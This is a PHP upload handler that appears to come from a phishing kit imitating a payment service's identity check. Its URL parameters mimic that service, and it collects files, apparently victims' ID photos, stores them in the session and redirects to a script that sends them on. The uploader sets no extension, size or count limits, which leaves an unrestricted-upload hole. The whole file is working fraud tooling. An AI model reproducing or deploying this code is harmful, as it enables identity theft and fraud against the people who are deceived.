<?php
    session_start();
    error_reporting(E_ERROR | E_PARSE);
    include('../src/class.fileuploader.php');
    include('../../hash.php');
    include('../include/get_lg.php');
	
	// initialize FileUploader
    $FileUploader = new FileUploader('files', array(
        'limit' => null,
        'maxSize' => null,
		'fileMaxSize' => null,
        'extensions' => null,
        'required' => false,
        'uploadDir' => '../../uploads/',
        'title' => 'name',
		'replace' => false,
        'listInput' => true,
        'files' => null
    ));
	
	// call to upload the files
    $data = $FileUploader->upload();

    // if uploaded and success
    if($data['isSuccess'] && count($data['files']) > 0) {
        // get uploaded files
        $uploadedFiles = $data['files'];
    }
    // if warnings
	if($data['hasWarnings']) {
        $warnings = $data['warnings'];
        
   		echo '<pre>';
        print_r($warnings);
		echo '</pre>';
    }
	
	// unlink the files
	// !important only for appended files
	// you will need to give the array with appendend files in 'files' option of the fileUploader
	foreach($FileUploader->getRemovedFiles('file') as $key=>$value) {
		unlink('../../uploads/' . $value['name']);
	}
	
	// get the fileList
	$fileList = $FileUploader->getFileList();

    if(count($fileList) <= 0) {
        $xDIRx = "ids.php?country.x=".$_SESSION['xcountryCodex']."&locale.x=".getLG($_SESSION['xcountryCodex'])."_".$_SESSION['xcountryCodex']."&customer.x=ID-PA".$hash."&safety=".$hash2;
            echo '<meta http-equiv="refresh" content="0; URL=../'.$xDIRx.'" />';
    }
    else {
        //SEND PATH FILE 
        $_SESSION['xysimgsx'] = $fileList;
        echo '<meta http-equiv="refresh" content="0; URL=../send/send_id.php" />';
    }

?>